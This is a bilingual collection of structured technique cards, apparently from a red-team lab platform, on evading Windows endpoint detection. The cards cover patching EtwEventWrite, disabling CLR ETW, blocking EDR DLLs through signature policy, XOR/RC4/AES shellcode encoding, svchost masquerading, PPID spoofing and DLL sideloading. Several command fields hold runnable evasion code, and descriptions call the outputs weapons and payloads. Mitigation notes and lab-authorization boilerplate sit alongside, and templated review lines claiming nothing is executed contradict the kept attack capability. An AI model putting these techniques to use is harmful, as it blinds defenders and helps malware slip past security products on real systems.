description.zh: 绕过 ETL 会话与 .NET 提供程序监控：将 ntdll!EtwEventWrite 首字节补丁为 RET，事件不再下发。成功判据：操作期间事件通道无新增记录。
description.en: Evades ETL sessions and .NET providers by patching the first byte of ntdll!EtwEventWrite to RET so events stop flowing. Success: no new records in the event channels during the operation.

title.zh: COMPlus 环境禁用规避变体

description.zh: 绕过 .NET 运行时事件（CLR/JIT/Loader 日志）：环境变量关闭 CLR ETW 提供程序。成功判据：DotNETRuntime 通道无新事件且命令执行。
description.en: Evades .NET runtime events (CLR/JIT/Loader logs) by disabling the CLR ETW provider via environment variable. Success: no new DotNETRuntime events while the command executes.

description.zh: 绕过目标提供程序的事件上报：反注册/禁用句柄使遥测静默。成功判据：操作后相关通道静默。
description.en: Evades provider event reporting by deregistering/disabling handles to silence telemetry. Success: the relevant channels go quiet afterwards.

name.zh: 进程模块签名策略审计

description.zh: 进程模块签名策略审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 进程模块签名策略审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Process Module-Signature Policy Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 进程模块签名策略审计覆盖进程缓解策略场景：针对安全产品依赖 DLL 注入实现监控的机制，验证签名策略能否阻止未签名 DLL 进入目标进程。验证维度涵盖 Get-ProcessMitigation 策略读取、多来源一致性核对与 C# SetProcessMitigationPolicy 设置三类。
overview.en: Process Module-Signature Policy Audit covers process mitigation policy: given security products that monitor via DLL injection, verify whether a signature policy can stop unsigned DLLs from entering the target process. Verification dimensions cover Get-ProcessMitigation policy reads, multi-source consistency checks, and C# SetProcessMitigationPolicy configuration.

vulnerability.zh: 根因是 Windows 允许为进程设置 ProcessSignaturePolicy（仅 Microsoft 签名可载入），而 EDR 常以用户态 DLL 注入实现监控；策略生效后未签名的安全产品 DLL 被拒载，进程内遥测随之静默，形成检测盲区。
vulnerability.en: The root cause is that Windows lets a process set ProcessSignaturePolicy (Microsoft-signed DLLs only), while EDRs commonly monitor via user-mode DLL injection; once the policy is active, unsigned security-product DLLs are refused and in-process telemetry falls silent, creating a detection blind spot.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-ProcessMitigation 读取实验进程的缓解策略明细；第 2 步重复读取用于多来源一致性核对；第 3 步以 C# 调用 SetProcessMitigationPolicy 设置 SignatureLevel=0x0F，未签名 DLL 加载被拒即确认策略生效，同时观察安全产品监控是否因此中断。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 reads the lab process's mitigation details with Get-ProcessMitigation; step 2 repeats the read for multi-source consistency; step 3 sets SignatureLevel=0x0F via C# SetProcessMitigationPolicy — unsigned DLL loads refused confirms the policy took effect, while observing whether security-product monitoring breaks. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 为安全产品进程预配置签名策略豁免并启用防篡改保护，监控 SetProcessMitigationPolicy 调用与安全产品 DLL 加载失败事件；EDR 补充内核回调数据源避免单点失明。修复后用第 3 步样例回归，策略设置应被阻断或立即告警。
mitigation.en: Pre-configure signature-policy exemptions for security-product processes and enable tamper protection; monitor SetProcessMitigationPolicy calls and security-product DLL load failures, and give EDRs kernel-callback data sources to avoid single-point blindness. After the fix, regress with the step 3 sample: policy setting must be blocked or alerted immediately.

description.zh: 用 Get-ProcessMitigation 查看目标进程的 DLL 签名策略；SignatureLevel 显示的强制等级即加载非微软 DLL 的门槛。
description.en: Check the target's DLL signature policy with Get-ProcessMitigation; the enforced SignatureLevel is the bar for loading non-Microsoft DLLs.

title.zh: 比对父子进程策略差异

description.zh: 对宿主与其子进程分别读取签名策略并比对差异；子进程继承不全或仅告警不强制即存在加载未签名 DLL 的利用窗口。
description.en: Read the policy for host and child separately; incomplete inheritance or audit-only enforcement leaves a window for unsigned modules.

title.zh: 重设签名策略放行载荷
title.en: Relax the policy for payload DLLs

description.zh: P/Invoke SetProcessMitigationPolicy 下调签名级别；随后注入的自定义 DLL 顺利加载即策略被攻击者自行改写。
description.en: Lower the signature level via P/Invoke SetProcessMitigationPolicy; the custom DLL loading cleanly shows the policy was rewritten under attacker control.

analysis.zh: 进程模块签名策略审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Process Module-Signature Policy Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 读取目标进程的 BinarySignaturePolicy 与模块加载事件，不创建受保护进程或屏蔽安全 DLL。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过非签名 DLL 拦截的旁路实现差异：验证策略继承链中的豁免路径。成功判据：子进程加载非签名 DLL 未被阻断。
description.en: Evades unsigned-DLL blocking via exemption paths in the policy inheritance chain. Success: the child process loads unsigned DLLs without being blocked.

title.zh: C# 直接调用规避变体

wafBypass.command: [DllImport("kernel32.dll")] static extern bool SetProcessMitigationPolicy(int policy, ref long buffer, int size); long buf=1; SetProcessMitigationPolicy(10, ref buf, 8);

description.zh: 绕过 PowerShell 层遥测：直接 P/Invoke 设置签名策略，无模块加载日志。成功判据：策略生效且无 PS 遥测事件。
description.en: Evades PowerShell-layer telemetry by setting the signature policy via direct P/Invoke with no module-load logging. Success: the policy applies with no PS telemetry events.

title.zh: 策略动态恢复规避变体

description.zh: 绕过策略长期异常的监控告警：操作前保存策略、操作后即时恢复，异常窗口最小化。成功判据：窗口内完成加载且策略终态一致。
description.en: Evades monitoring of long-lived policy anomalies by saving the policy before the operation and restoring immediately after, minimizing the anomaly window. Success: loads complete inside the window and the final policy matches the original.

name.zh: 编码内存载荷检测回归

description.zh: 编码内存载荷检测回归保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Encoded In-Memory Payload Detection Regression preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 编码内存载荷检测回归 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Encoded In-Memory Payload Detection Regression are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 编码内存载荷检测回归覆盖载荷编码与静态检测对抗场景：针对静态特征扫描机制，验证 XOR 与 RC4 编码对检出率的影响。验证维度涵盖编码器脚本调用、XOR 循环参考实现、RC4 加密实现与不可执行夹具哈希基线四类步骤。
overview.en: Encoded In-Memory Payload Detection Regression covers payload encoding versus static detection: against signature-based scanning, verify how XOR and RC4 encoding affect detection rates. Verification dimensions cover encoder script invocation, an XOR-loop reference implementation, RC4 encryption, and a hash baseline over a non-executable byte fixture.

vulnerability.zh: 根因是静态检测依赖明文字节特征与熵值阈值，XOR/RC4 编码使载荷不再命中已知签名；高熵本身并不必然判恶，检测需要同时覆盖熵、导入表与内存行为，任一维度缺失即形成编码绕过窗口。
vulnerability.en: The root cause is that static detection depends on plaintext byte signatures and entropy thresholds, and XOR/RC4 encoding stops payloads matching known signatures; high entropy alone is not proof of malice, so detection must jointly cover entropy, import tables, and memory behavior — any missing dimension opens an encoding bypass window.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 shellcode_encoder.py 对夹具文件编码，输出文件可逆解码一致即确认工具链；第 2 步用 XOR 循环参考实现复现并比对输出一致；第 3 步用 PyCryptodome ARC4 复现 RC4 加密并比对参考密文；第 4 步对不可执行字节夹具计算 SHA256，作为非执行完整性基线。全程仅使用无执行语义的字节夹具；LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 encodes the fixture file with shellcode_encoder.py — a reversible-decode match on the output confirms the toolchain; step 2 replays with the XOR-loop reference and matches output; step 3 replays RC4 with PyCryptodome ARC4 and matches the reference ciphertext; step 4 computes the SHA256 of the non-executable byte fixture as the integrity baseline. Use only byte fixtures with no execution semantics throughout; replace LAB_* placeholders via the global variables menu.

mitigation.zh: 检测侧引入熵值、导入表与内存行为多维规则，对加密载荷落盘与可疑解码链建立告警，并启用内存扫描覆盖解码后形态。修复后用第 1-3 步样例回归，编码文件应触发熵或行为类告警。
mitigation.en: Add multi-dimensional rules over entropy, import tables, and memory behavior, alert on encrypted payload drops and suspicious decode chains, and enable memory scanning to cover post-decode forms. After the fix, regress with the step 1-3 samples: encoded files must trigger entropy or behavior alerts.

title.zh: 编码 shellcode 摆脱签名
title.en: Encode shellcode off the signature list

description.zh: 用 shellcode_encoder.py 以随机密钥加工原始 shellcode；产物哈希改变且功能可还原即脱离静态特征库。
description.en: Process the shellcode with shellcode_encoder.py under a random key; a changed hash with recoverable function escapes static signatures.

title.zh: 异或轮转密钥落地实现
title.en: Implement XOR with a rotating key

description.zh: 按 key[i % len] 对字节流逐位异或；加载器内嵌同一密钥在内存还原后跳转执行即运行时等价。
description.en: XOR each byte with key[i % len]; the loader embedding the same key restores and jumps to it in memory, runtime-equivalent to the original.

title.zh: 换用 RC4 加密变体

description.zh: 用 ARC4.new(key).encrypt 处理 shellcode；密文分布接近随机即进一步压低熵扫描与特征命中率。
description.en: Encrypt with ARC4.new(key).encrypt; near-random ciphertext further lowers entropy scanning and signature hit rates.

description.zh: 对编码产物用 Get-FileHash 计算 SHA256；哈希与加载器内置值一致即确保投递到目标主机后仍能正确解密并执行。
description.en: Hash the encoded artifact with SHA256; matching the loader's built-in value guarantees correct decryption and execution after delivery.

analysis.zh: 编码内存载荷检测回归只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Encoded In-Memory Payload Detection Regression is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只对不可执行字节夹具计算熵、哈希和静态规则结果，不解密或运行 shellcode。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: AES-CBC 加密变形规避变体

wafBypass.command:
python3 - <<'PY'
from Crypto.Cipher import AES
from os import urandom
key=urandom(32); iv=urandom(16)
sc=open('{LAB_SHELLCODE_FILE}','rb').read()
sc+=b'\x90'*((-len(sc))%16)
open('{LAB_ENCODED_FILE}','wb').write(iv+AES.new(key,AES.MODE_CBC,iv).encrypt(sc))
print(key.hex())
PY

description.zh: 绕过静态熵分析与 XOR 特征扫描：AES-CBC 加密使载荷熵呈随机分布。成功判据：{LAB_ENCODED_FILE} 熵接近 7.99 且解密后可执行。
description.en: Evades static entropy analysis and XOR signature scanning since AES-CBC ciphertext presents near-random entropy. Success: {LAB_ENCODED_FILE} entropy approaches 7.99 and decrypts to executable shellcode.

title.zh: 多轮滚动异或规避变体

wafBypass.command:
python3 - <<'PY'
sc=bytearray(open('{LAB_SHELLCODE_FILE}','rb').read())
keys=[b'k1!',b'k2@',b'k3#']
for k in keys:
    for i in range(len(sc)): sc[i]^=k[i%len(k)]
open('{LAB_ENCODED_FILE}','wb').write(sc)
PY

description.zh: 绕过单字节/单密钥 XOR 的已知明文破解：三轮不同长密钥滚动异或。成功判据：三轮逆序解密还原 shellcode。
description.en: Evades known-plaintext recovery against single-key XOR by rolling three different-length keys. Success: reverse-order decryption restores the shellcode.

title.zh: RC4 密钥派生变形规避变体

wafBypass.command:
python3 - <<'PY'
from Crypto.Cipher import ARC4
from hashlib import sha256
key=sha256(b'{LAB_RC4_SEED}').digest()
open('{LAB_ENCODED_FILE}','wb').write(ARC4.new(key).encrypt(open('{LAB_SHELLCODE_FILE}','rb').read()))
PY

description.zh: 绕过对固定密钥 RC4 流的特征还原：以种子派生密钥且每次不同。成功判据：派生密钥解密成功。
description.en: Evades signature recovery against fixed-key RC4 streams by deriving the key from a seed each run. Success: the derived key decrypts successfully.

name.zh: 进程映像与命令行一致性审计
name.en: Process Image and Command-Line Consistency Audit

description.zh: 进程映像与命令行一致性审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Process Image and Command-Line Consistency Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 进程映像与命令行一致性审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Process Image and Command-Line Consistency Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 进程映像与命令行一致性审计覆盖进程伪装检测场景：针对依赖映像路径与命令行关联的检测逻辑，验证映像与名称不一致的进程能否被稳定识别。验证维度涵盖 spawnto/ppid 配置核对、映像复制伪装执行与 Win32_Process 多源字段比对三类。
overview.en: Process Image and Command-Line Consistency Audit covers process masquerading detection: for detection logic relying on image-path and command-line correlation, verify whether processes with image/name mismatches are reliably identified. Verification dimensions cover spawnto/ppid configuration checks, image-copy masquerade execution, and Win32_Process multi-source field comparison.

vulnerability.zh: 根因是进程名可复制而映像路径不可伪造，仅按进程名或父进程判断的检测即被绕过；伪装进程在用户可写目录运行时，ExecutablePath 与其声称的系统进程名必然不一致，构成稳定检测信号。
vulnerability.en: The root cause is that process names are copyable while image paths are not, so detection judging only by process name or parent is bypassed; a masquerading process running from a user-writable directory necessarily mismatches ExecutablePath against its claimed system process name — a stable detection signal.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 spawnto 与 ppid 配置指定派生进程映像与父进程，配置生效即确认起点；第 2 步复制 cmd.exe 为临时目录下的 svchost.exe 并隐藏窗口执行，Get-Process 显示其 Path 指向临时目录即确认伪装成立；第 3 步用 Win32_Process 输出 PID/父 PID/路径/命令行清单，比对映像路径与命令行不一致项完成检测验证。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 sets the derived process image and parent with spawnto and ppid — effective configuration marks the starting point; step 2 copies cmd.exe as svchost.exe in a temp directory and runs it hidden — Get-Process showing Path in the temp directory confirms the masquerade; step 3 lists PID/parent PID/path/command line with Win32_Process and compares image-path versus command-line mismatches to complete detection validation. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 检测侧按映像路径、签名与父进程链三维校验而非进程名，对用户可写目录中出现系统进程名建立告警；启用 Sysmon 事件 1 并采集完整命令行。修复后用第 2 步样例回归，伪装进程应触发映像不一致告警。
mitigation.en: Validate by image path, signature, and parent chain rather than process name; alert on system process names appearing from user-writable directories; enable Sysmon event 1 with full command lines. After the fix, regress with the step 2 sample: the masquerading process must trigger an image-mismatch alert.

title.en: Configure spawning as a legit binary

description.zh: 用 spawnto x64 指定 svchost.exe 作为派生进程映像并锁定父进程 PID；后续注入动作均以常见系统进程形态出现。
description.en: Set spawnto x64 to svchost.exe with a pinned parent PID; later injections all wear the shape of a familiar system process.

description.zh: 把 cmd.exe 复制改名为 svchost.exe 隐藏窗口启动；进程名列表显示 svchost 即完成目视层伪装。
description.en: Copy cmd.exe as svchost.exe and start it hidden; the process list showing svchost completes the visual masquerade.

title.zh: 校验进程元数据一致性

description.zh: 用 Get-CimInstance Win32_Process 核对可执行路径与命令行；路径落在 TEMP 而非 System32 即需配合父进程伪装补齐上下文。
description.en: Check ExecutablePath and CommandLine with Get-CimInstance; a TEMP path instead of System32 needs parent-process spoofing to complete the disguise.

analysis.zh: 进程映像与命令行一致性审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Process Image and Command-Line Consistency Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 关联进程映像路径、签名、父进程和命令行遥测，不创建挂起或伪装进程。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: PEB 参数覆写规避变体

description.zh: 绕过跨进程镜像一致性校验：进程创建后改写 PEB 命令行指针，使遥测读到伪装值。成功判据：Get-CimInstance 显示伪装命令行。
description.en: Evades cross-process image consistency checks by rewriting the PEB command-line pointer post-creation so telemetry reads the masqueraded value. Success: Get-CimInstance shows the masqueraded command line.

title.zh: 合法父进程选择规避变体

wafBypass.command: $p=Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1; Start-Process cmd -ArgumentList '/c whoami' -WindowStyle Hidden

description.zh: 绕过异常父子关系检测（powershell→cmd 类规则）：由 explorer 常驻进程派生。成功判据：进程树中父进程为 explorer.exe。
description.en: Evades anomalous parent-child rules (powershell→cmd) by spawning from the resident explorer.exe. Success: the process tree shows explorer.exe as the parent.

title.zh: 完整路径与参数一致性规避变体

description.zh: 绕过镜像名与参数行为不一致的启发式：改名二进制配同步类参数风格。成功判据：pm.log 生成且无 masquerading 告警。
description.en: Evades heuristics on image-name versus behavior mismatch by renaming the binary and using sync-style arguments. Success: pm.log appears with no masquerading alerts.

name.zh: 父进程属性与遥测一致性审计

description.zh: 父进程属性与遥测一致性审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Parent-Process Attribute and Telemetry Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 父进程属性与遥测一致性审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Parent-Process Attribute and Telemetry Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 父进程属性与遥测一致性审计覆盖 PPID 伪造检测场景：针对依赖父进程归属的检测逻辑，验证属性列表伪造与多源遥测差异能否被识别。验证维度涵盖 STARTUPINFOEX 实现审计、结构定义片段对照与 Win32_Process 父子关系核对三类。
overview.en: Parent-Process Attribute and Telemetry Audit covers PPID spoofing detection: for detection logic relying on parent attribution, verify whether attribute-list spoofing and multi-source telemetry divergences are recognizable. Verification dimensions cover STARTUPINFOEX implementation review, structure-definition comparison, and Win32_Process parent-child checks.

vulnerability.zh: 根因是 CreateProcess 的属性列表支持显式指定父进程，子进程继承伪造父进程的令牌与归属关系；若内核、ETW 与安全产品采集的父字段不一致或缺失，基于进程树的关联即被伪造父子关系欺骗。
vulnerability.en: The root cause is CreateProcess's attribute list supporting an explicit parent process, with the child inheriting the forged parent's token and attribution; when the parent fields captured by the kernel, ETW, and security products are inconsistent or missing, process-tree correlation is deceived by the forged relationship.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步审阅 PowerShell 托管封装的 STARTUPINFOEX 实现片段，确认 InitializeProcThreadAttributeList/UpdateProcThreadAttribute 是真实实现路径（ProcessStartInfo 无 ParentProcessId 属性，不可直接赋值）；第 2 步对照结构定义片段完成代码审计；第 3 步用 Win32_Process 输出 PID/父 PID/创建时间清单，核对父子进程一致性并定位伪造样本。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 reviews the PowerShell-hosted STARTUPINFOEX implementation, confirming InitializeProcThreadAttributeList/UpdateProcThreadAttribute as the real implementation path (ProcessStartInfo has no ParentProcessId property to assign); step 2 completes code audit against the structure-definition snippet; step 3 lists PID/parent PID/creation time with Win32_Process, checks parent-child consistency, and locates spoofed samples. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 检测侧以内核回调与 Sysmon 事件 1 为权威核对父子链，对父进程已退出或服务派生异常的进程告警；安全产品保留多源父字段快照以便比对。修复后用第 3 步样例回归，伪造父子关系应被一致性检查标记。
mitigation.en: Treat kernel callbacks and Sysmon event 1 as authoritative for parent chains, alert on processes whose parent has exited or whose service lineage is anomalous, and keep multi-source parent-field snapshots for comparison. After the fix, regress with the step 3 sample: forged parent-child relations must be flagged by consistency checks.

description.zh: 编译基于 STARTUPINFOEX 属性列表的 PpidSpoof 程序；产出可执行文件即具备改写父进程 ID 的武器。
description.en: Compile the STARTUPINFOEX-based PpidSpoof program; the resulting binary is the weapon for rewriting parent process IDs.

description.zh: 以 UpdateProcThreadAttribute 指定 explorer 等合法父进程再创建进程；子进程 PPID 显示合法链即继承可信上下文。
description.en: Set explorer as the parent via UpdateProcThreadAttribute before CreateProcess; the child showing a legitimate PPID inherits trusted context.

title.zh: 核对进程链路伪装效果

description.zh: 用 Get-CimInstance 核对 ParentProcessId 链路；呈现合法父进程直挂载荷且无孤儿进程即伪装闭环。
description.en: Check ParentProcessId chains with Get-CimInstance; a legitimate parent directly holding the payload with no orphans closes the disguise loop.

analysis.zh: 父进程属性与遥测一致性审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Parent-Process Attribute and Telemetry Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 比较内核、ETW 与 EDR 的父进程字段并使用正常子进程夹具，不调用属性列表伪造 PPID。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 属性列表组合规避变体

description.zh: 绕过单属性 PPID 检测：以完整属性列表伪造父进程与继承链。成功判据：子进程 PPID 显示为 {LAB_PARENT_PID}。
description.en: Evades single-attribute PPID detection by forging the parent and inheritance chain via a full attribute list. Success: the child's PPID shows {LAB_PARENT_PID}.

description.zh: 绕过同架构父进程模板检测：以 32 位宿主配 64 位父进程伪造混合架构链。成功判据：进程树呈现跨架构父子关系。
description.en: Evades same-arch parent template detection by pairing a 32-bit host with a 64-bit forged parent for a mixed-architecture chain. Success: the process tree shows the cross-arch parentage.

title.zh: 无注入 API 组合规避变体

wafBypass.command: cmd /c start /b /min C:\Windows\System32\notepad.exe && powershell -nop -c "$p=Get-Process notepad | Select-Object -First 1; (Get-CimInstance Win32_Process -Filter \"ProcessId=$($p.Id)\").ParentProcessId"

description.zh: 绕过 PROC_THREAD_ATTRIBUTE 使用监控：用 shell start 指令组合自然形成目标父进程关系。成功判据：父子关系成立且无属性 API 调用。
description.en: Evades monitoring of PROC_THREAD_ATTRIBUTE usage by naturally forming the target parentage through shell start composition. Success: the parent-child relation holds with no attribute API calls.

name.zh: DLL 侧加载搜索顺序检测

description.zh: DLL 侧加载搜索顺序检测保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: DLL Sideloading Search-Order Detection preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 DLL 侧加载搜索顺序检测 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DLL Sideloading Search-Order Detection are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: DLL 侧加载搜索顺序检测覆盖 DLL 搜索顺序劫持场景：针对签名应用加载非签名依赖的行为，验证侧加载候选点与签名状态能否被系统枚举。验证维度涵盖应用二进制签名读取、多来源签名核对与签名缺失候选标记三类步骤。
overview.en: DLL Sideloading Search-Order Detection covers DLL search-order hijacking: for signed applications loading unsigned dependencies, verify whether sideloading candidates and signature states can be enumerated systematically. Verification dimensions cover application binary signature reads, multi-source signature checks, and flagging signature-missing candidates.

vulnerability.zh: 根因是 Windows DLL 搜索顺序优先应用目录，签名应用加载同名单名 DLL 时不校验该 DLL 自身签名；攻击者把恶意 DLL 放入应用目录即可借签名宿主进程执行，使仅校验主进程签名的可信度评估失效。
vulnerability.en: The root cause is the Windows DLL search order preferring the application directory and signed apps not validating the loaded same-name DLL's own signature; placing a malicious DLL in the application directory executes it under the signed host process, defeating trust assessments that check only the main process signature.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-AuthenticodeSignature 读取应用二进制的签名状态与签名者信息；第 2 步重复读取用于多来源核对；第 3 步再次输出并确认签名缺失或不受信的应用二进制，将其标记为侧加载候选宿主，再核对应用目录 ACL 与缺失 DLL 清单定位可写入的注入点。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 reads the application binary's signature status and signer with Get-AuthenticodeSignature; step 2 repeats the read for multi-source checks; step 3 outputs again and flags binaries whose signature is missing or untrusted as sideloading candidate hosts, then inspects application-directory ACLs and missing-DLL lists to locate writable injection points. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 为应用目录配置仅管理员可写 ACL，启用依赖库签名强制并移除多余 DLL；用 Sysmon 事件 7 监控来自异常路径的模块加载。修复后用第 3 步样例回归，侧加载候选点应被 ACL 或签名策略阻断。
